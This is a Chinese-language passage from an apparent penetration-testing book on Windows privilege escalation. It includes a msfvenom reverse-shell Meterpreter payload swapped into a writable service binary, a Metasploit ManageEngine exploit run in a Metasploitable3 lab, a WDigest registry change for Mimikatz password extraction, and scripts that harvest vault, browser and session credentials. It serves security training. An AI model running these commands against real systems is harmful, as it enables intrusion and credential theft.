### 检查AlwaysInstallElevated注册表项
AlwaysInstallElevated注册表项用于标识是否使用提升的权限安装.MSI文件（NT AUTHORITY \ SYSTEM）。请注意，我们无需手动执行这些操作，因为Windows中的Metasploit和PowerShell工具模块已经实现了该功能。在下面的示例中，我们将介绍PowerUp PowerShell脚本。此脚本通常与Empire一起运行，并会检查所有常见的错误配置区域，以找到允许常规用户获取本地管理或系统账户权限的漏洞。

#### 示例：使用PowerUp PowerShell脚本
1. **运行PowerUp脚本**：
   ```powershell
   usermodule privesc/powerup/allchecks
   ```
2. **查看结果**：
   ```plaintext
   ServiceName: WavesSysSvc
   Path: C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe
   ModifiableFile: C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe
   ModifiableFilePermissions: {WriteOwner, Delete, WriteAttributes, Synchronize...}
   ModifiableFileIdentityReference: Everyone
   StartName: LocalSystem
   ```

对于WavesSysSyc服务，每个用户都具有写权限，这意味着可以用恶意二进制文件替换WaveSysSvc64.exe文件。

#### 创建Meterpreter二进制文件并替换原始文件
1. **创建Meterpreter二进制文件**：
   ```bash
   msfvenom -p windows/meterpreter/reverse_https LHOST=[ip] LPORT=8080 -f exe > shell.exe
   ```
2. **上传二进制文件并替换原始文件**：
   ```powershell
   upload ./shell.exe C:\users\test\shell.exe
   copy C:\users\test\Desktop\shell.exe "C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe"
   ```
3. **重新启动服务或等待系统重新启动**：
   一旦服务重新启动，Meterpreter Shell将具有系统权限。

### 检查未修补的Windows系统
对于未修补的Windows系统，确实存在权限提升漏洞。如何快速识别Windows系统上安装的补丁？我们可以使用默认命令`systeminfo`来查看安装了哪些服务包。

#### 使用systeminfo命令
1. **在被攻击者系统上运行systeminfo**：
   ```cmd
   systeminfo > windows.txt
   ```
2. **将windows.txt复制到Kali系统的/opt/Windows-Exploit-Suggester目录**。
3. **运行Windows Exploit Suggester**：
   ```bash
   python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls
   ```

这个工具虽然一段时间没有更新，但仍然可以帮助您找到权限提升漏洞。

### 在已打好补丁的Windows环境中
如果在一个已打好补丁的Windows环境中，我们会关注第三方软件中的权限提升漏洞或操作系统的任何0-day/新漏洞。例如，我们一直在挖掘Windows中的权限提升漏洞，这些漏洞在本书写作之时未打补丁。在这种情况下，通常可能存在一些基本的漏洞演示代码，但我们仍需测试、验证并多次完成攻击。

### 权限提升实验
测试和尝试不同权限提升漏洞的较好的实验环境是Metasploitable3，由Rapid7提供。这个存在漏洞的框架会自动构建一个Windows虚拟机，包含了所有常见漏洞和一些不常见的漏洞。

#### 示例：使用Metasploitable3
1. **使用Nmap工具扫描Metasploitable3设备**：
   ```bash
   nmap -p- [target_ip]
   ```
2. **启动Metasploit并搜索ManageEngine漏洞**：
   ```bash
   msfconsole
   search manageengine
   use exploit/windows/http/manageengine_connectionid_write
   set SSL True
   set RPORT 8383
   set RHOST [target_ip]
   exploit
   getsystem
   ```

### 从内存中提取明文文本凭证
Mimikatz 工具在获取明文密码方面改变了游戏规则。但在Windows 10之前，在主机上以管理员身份运行Mimikatz工具，攻击者可以从LSASS（本地安全子系统）中提取明文密码。现在，我们需要设置注册表项将密码放到LSASS中。

#### 设置注册表项
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

#### 使用Empire工具
```powershell
shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

### 从Windows凭证存储中心和浏览器中获取密码
Windows凭证存储中心是Windows的默认功能，它为系统、网站和服务器保存用户名、密码和证书。我们可以导入两个不同的PowerShell脚本来搜集这些数据。

#### 获取网站凭证
```powershell
Get-WebCredentials
```

#### 获取Windows凭证
```powershell
Get-WindowsCredentials
```

#### 提取浏览器Cookie
```powershell
Invoke-BrowserHistory
```

#### 使用SessionGopher工具
```powershell
. .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
```

通过这些方法，我们可以在用户环境中访问主机的许多资源，从而帮助我们继续渗透。